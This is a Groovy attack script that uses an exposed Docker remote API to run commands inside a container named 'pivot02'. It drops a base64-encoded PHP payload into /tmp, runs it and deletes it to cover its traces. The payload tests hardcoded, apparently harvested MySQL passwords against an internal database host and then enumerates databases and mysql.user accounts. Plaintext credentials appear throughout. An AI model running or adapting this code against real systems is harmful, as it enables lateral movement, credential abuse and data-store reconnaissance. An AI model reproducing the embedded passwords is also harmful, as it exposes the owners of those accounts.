// MySQL auth confirmation via PHP PDO in pivot02 (ubi7-php72 has pdo_mysql)
dockerApi = "http://172.27.140.148:4243"

def httpPost(String urlStr, String jsonBody) {
    def conn = (HttpURLConnection) new URL(urlStr).openConnection()
    conn.setRequestMethod("POST")
    conn.setDoOutput(true)
    conn.setConnectTimeout(10000)
    conn.setReadTimeout(90000)
    conn.setRequestProperty("Content-Type", "application/json")
    if (jsonBody != null) conn.getOutputStream().write(jsonBody.getBytes("UTF-8"))
    def code = conn.getResponseCode()
    def body = (code >= 400 ? conn.getErrorStream()?.getText("UTF-8") : conn.getInputStream().getText("UTF-8"))
    conn.disconnect()
    return [code: code, body: body]
}

def execIn(String containerId, String cmd) {
    def createBody = '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["/bin/bash","-c",' + groovy.json.JsonOutput.toJson(cmd) + ']}'
    def r1 = httpPost(dockerApi + "/containers/" + containerId + "/exec", createBody)
    if (r1.code != 201) { return "EXEC_CREATE_FAIL HTTP " + r1.code + ": " + r1.body }
    def execId = new groovy.json.JsonSlurper().parseText(r1.body).Id
    def r2 = httpPost(dockerApi + "/exec/" + execId + "/start", '{"Detach":false,"Tty":true}')
    return r2.body
}

def php = '''<?php
error_reporting(E_ALL);
$tests = array(
    array("T1PAGOS_payment_t1", "172.27.141.4", 3306, "payment_t1", "app_t1", "wUt22Us2CUh#+M="),
    array("T1PAGOS_nodb",       "172.27.141.4", 3306, "",           "app_t1", "wUt22Us2CUh#+M="),
    array("SEARS_on_141.4",     "172.27.141.4", 3306, "",           "apifincadob", "nNzy]Ku2Ah=u%y1I"),
);
foreach ($tests as $t) {
    list($label,$h,$p,$db,$u,$pw) = $t;
    $dsn = "mysql:host=$h;port=$p" . ($db ? ";dbname=$db" : "");
    try {
        $pdo = new PDO($dsn, $u, $pw, array(PDO::ATTR_TIMEOUT => 6, PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION));
        echo "AUTH_OK|$label|$h:$p|$db|$u\\n";
        foreach ($pdo->query("SELECT VERSION() v, CURRENT_USER() cu, @@hostname hn, @@port pt") as $r) {
            echo "  VERSION=".$r['v']." | CURRENT_USER=".$r['cu']." | HOSTNAME=".$r['hn']." | PORT=".$r['pt']."\\n";
        }
        foreach ($pdo->query("SHOW DATABASES") as $r) { echo "  DB: ".$r[0]."\\n"; }
        foreach ($pdo->query("SELECT user,host,plugin FROM mysql.user LIMIT 30") as $r) { echo "  MYSQLUSER: ".$r[0]."@".$r[1]." (".$r[2].")\\n"; }
    } catch (Exception $e) {
        echo "AUTH_FAIL|$label|$h:$p|$db|$u|".str_replace("\\n"," ",$e->getMessage())."\\n";
    }
}
echo "PHP_DONE\\n";
'''

def b64 = php.getBytes("UTF-8").encodeBase64().toString()
def cmd = "echo " + b64 + " | base64 -d > /tmp/q.php && php /tmp/q.php; rm -f /tmp/q.php"

println "########## MySQL AUTH TESTS from pivot02 ##########"
println execIn("5b32e909c295", cmd)
